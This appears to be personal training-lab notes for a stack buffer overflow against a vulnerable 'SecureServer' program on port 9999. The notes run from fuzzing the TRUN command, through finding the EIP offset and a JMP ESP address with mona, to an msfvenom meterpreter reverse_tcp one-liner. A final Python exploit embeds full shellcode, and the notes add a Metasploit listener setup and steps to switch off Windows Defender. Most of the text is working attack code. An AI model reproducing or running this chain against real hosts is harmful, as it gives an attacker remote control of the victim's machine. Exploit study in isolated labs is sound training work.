# Static Analysis
***LINUX***

	strings
	file file.ext

 # Dynamic 
***WINDOWS***

 run it (Double Click)

  see it's awaiting a connection

  check where it's listening from using netstat -antot

  check pid with tasklist

# Script 
```

#!/usr/bin/env python

import socket

buf = " "

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)   ## CREATING SOCKET, IPv4 TCP
s.connect(("192.168.65.10",9999)) ## DEFINE HOST AND PORT
print s.recv(1024) ## PRINT TO SCREEN THE RESPONSE
s.send(buf) ## SEND VARIABLE BUF
print s.recv(1024) ## PRINT TO SCREEN THE RESPONSE
s.close ## CLOSE THE SOCKET
```

***When Ran***
```
python wbuffo.py
 
Welcome to SecureServer! Enter HELP for help.

UNKNOWN COMMAND
```

***Modify Script to run HELP instead of previously used " "***

***OUTPUT***  
```
python wbuffo.py
Welcome to SecureServer! Enter HELP for help.

Valid Commands:
HELP
TRUN [value]
EXIT
```
***Modify Script to run "TRUN /.:/" instead of previously used "HELP"***

***FUZZ ALL COMMANDS, TRUN "/.:/" WORKS MODIFY SCRIPT AGAIN***
```
#!/usr/bin/env python

import socket

buf = "TRUN /.:/"
buf += "A" * 5000

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)   ## CREATING SOCKET, IPv4 TCP
s.connect(("192.168.65.10",9999)) ## DEFINE HOST AND PORT
print s.recv(1024) ## PRINT TO SCREEN THE RESPONSE
s.send(buf) ## SEND VARIABLE BUF
print s.recv(1024) ## PRINT TO SCREEN THE RESPONSE
s.close ## CLOSE THE SOCKET

```

***WINDOWS***

Rick click, Run as admin, Immunity Debugger

(If you get lost or screen changes, click "Window" tab and click "CPU" and it will retrun you to correct screen"

Click file in top right corner, click attach and select malware, malware must be running IOT attach

***LINUX***

RUN SCRIPT

Go to wiremask to Generate 5000 characters

Insert into script on buf +=

***WINDOWS***

Rewind ImDb and press play, run script in LInux

Grab EIP

Put into "Register Value" Box under "FIND THE OFFSET" on Wiremask

Get OFFSET value and modify script

```
#!/usr/bin/env python

import socket

buf = "TRUN /.:/"
buf += "A" * 2003
buf += "BBBB"

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)   ## CREATING SO$
s.connect(("192.168.65.10",9999)) ## DEFINE HOST AND PORT
print s.recv(1024) ## PRINT TO SCREEN THE RESPONSE
s.send(buf) ## SEND VARIABLE BUF
print s.recv(1024) ## PRINT TO SCREEN THE RESPONSE
s.close ## CLOSE THE SOCKET

```

***Windows***

Rewind Script

Press Play

***Linux***

Run Script

Check EIP is 42424242 (From buf += "BBBB"

You can now delete **buf += "BBBB"** as this was just to verify we were targeting EIP

***W***

In text bar input

	!mona modules
 
Press Enter

See Module that .exe calls and if all boxes say False it can be used for Buffer Overflow

In text box again input 

	!mona jmp -r esp -m "essfunc.dll"

Go to "Window" tab and click on "Log Data" to see reults of search


Right click copy address to clipboard

***L***

Insert into script 

	## 625011af -> "\xaf\x11\x50\x62"
 
Then modify buf variable with little endian of memory location and add nop sled

```
#!/usr/bin/env python

import socket

buf = "TRUN /.:/"
buf += "A" * 2003
buf += "\xaf\x11\x50\x62"
buf += "\90" * 15

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)   ## CREATING SO$
s.connect(("192.168.65.10",9999)) ## DEFINE HOST AND PORT
print s.recv(1024) ## PRINT TO SCREEN THE RESPONSE
s.send(buf) ## SEND VARIABLE BUF
print s.recv(1024) ## PRINT TO SCREEN THE RESPONSE
s.close ## CLOSE THE SOCKET

## 625011af -> "\xaf\x11\x50\x62"

```
Use Venom One Liner to get shellcode

	msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.33.129 lport=4444 -b "\x00" -f python


 Copy and Paste Shell Code into script
```
#!/usr/bin/env python

import socket

buf = "TRUN /.:/"
buf += "A" * 2003
buf += "\xaf\x11\x50\x62"
buf += "\90" * 15
buf += b"\xbf\x39\xfd\xe7\xf7\xd9\xc3\xd9\x74\x24\xf4\x5a"
buf += b"\x2b\xc9\xb1\x59\x83\xea\xfc\x31\x7a\x10\x03\x7a"
buf += b"\x10\xdb\x08\x1b\x1f\x94\xf3\xe4\xe0\xca\xc2\x36"
buf += b"\x84\x81\x77\x87\xcc\x70\xfc\xb5\xc2\xf1\x51\x2e"
buf += b"\xea\xfa\x59\xf9\x46\x22\xed\x77\x7f\x1b\x31\xdb"
buf += b"\x43\x3a\xcd\x26\x90\x9c\xec\xe8\xe5\xdd\x29\xbf"
buf += b"\x80\x32\xe7\x17\xe0\x9e\x18\x13\xb4\x22\x18\xf3"
buf += b"\xb2\x1a\x62\x76\x04\xee\xde\x79\x55\x85\x87\x59"
buf += b"\x54\x4a\xbc\xd2\x4e\x3c\x46\x2b\x1a\x80\x79\x53"
buf += b"\xaa\x73\x4d\x20\x2c\x55\x9f\xf6\x83\x98\x2f\xfb"
buf += b"\xda\xdd\x88\xe4\xa8\x15\xeb\x99\xaa\xee\x91\x45"
buf += b"\x3e\xf0\x32\x0d\x98\xd4\xc3\xc2\x7f\x9f\xc8\xaf"
buf += b"\xf4\xc7\xcc\x2e\xd8\x7c\xe8\xbb\xdf\x52\x78\xff"
buf += b"\xfb\x76\x20\x5b\x65\x2f\x8c\x0a\x9a\x2f\x68\xf2"
buf += b"\x3e\x24\x9b\xe5\x3f\xc5\x63\x0a\x62\x51\xaf\xc7"
buf += b"\x9d\xa1\xa7\x50\xed\x93\x68\xcb\x79\x9f\xe1\xd5"
buf += b"\x7e\x96\xe6\xe5\x51\x10\x66\x18\x52\x60\xae\xdf"
buf += b"\x06\x30\xd8\xf6\x26\xdb\x18\xf6\xf2\x71\x13\x60"
buf += b"\xf7\xb7\x02\xf1\x6f\xb5\x44\xe0\x33\x30\xa2\x52"
buf += b"\x9c\x12\x7b\x13\x4c\xd2\x2b\xfb\x86\xdd\x14\x1b"
buf += b"\xa9\x34\x3d\xb6\x46\xe0\x15\x2f\xfe\xa9\xee\xce"
buf += b"\xff\x64\x8b\xd1\x74\x8c\x6b\x9f\x7c\xe5\x7f\xc8"
buf += b"\x1a\x05\x80\x09\x8f\x05\xea\x0d\x19\x52\x82\x0f"
buf += b"\x7c\x94\x0d\xef\xab\xa7\x4a\x0f\x2a\x91\x21\x26"
buf += b"\xb8\x9d\x5d\x47\x2c\x1d\x9e\x11\x26\x1d\xf6\xc5"
buf += b"\x12\x4e\xe3\x09\x8f\xe3\xb8\x9f\x30\x55\x6c\x37"
buf += b"\x59\x5b\x4b\x7f\xc6\xa4\xbe\x03\x01\x5a\x3c\x2c"
buf += b"\xaa\x32\xbe\x6c\x4a\xc2\xd4\x6c\x1a\xaa\x23\x42"
buf += b"\x95\x1a\xcb\x49\xfe\x32\x46\x1c\x4c\xa3\x57\x35"
buf += b"\x10\x7d\x57\xba\x89\x8e\x22\xb3\x2e\x6f\xd3\xdd"
buf += b"\x4a\x70\xd3\xe1\x6c\x4d\x05\xd8\x1a\x90\x95\x5f"
buf += b"\x14\xa7\xb8\xf6\xbf\xc7\xef\x09\xea"


s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)   ## CREATING SO$
s.connect(("192.168.65.10",9999)) ## DEFINE HOST AND PORT
print s.recv(1024) ## PRINT TO SCREEN THE RESPONSE
s.send(buf) ## SEND VARIABLE BUF
print s.recv(1024) ## PRINT TO SCREEN THE RESPONSE
s.close ## CLOSE THE SOCKET

## 625011af -> "\xaf\x11\x50\x62"
```
 	
Create Meterpreter listener 

msfconsole

use multi/handler

set payload windows/meterpreter/reverse_tcp

set LHOST 0.0.0.0

set LPORT 4444

exploit

***W***
Turn off Win Defender

	Windows Security

 	Manage Settings

  	Turn off EVERYTHING

   ***L***


   Run Script

   Meterpreter shell should open
   

   




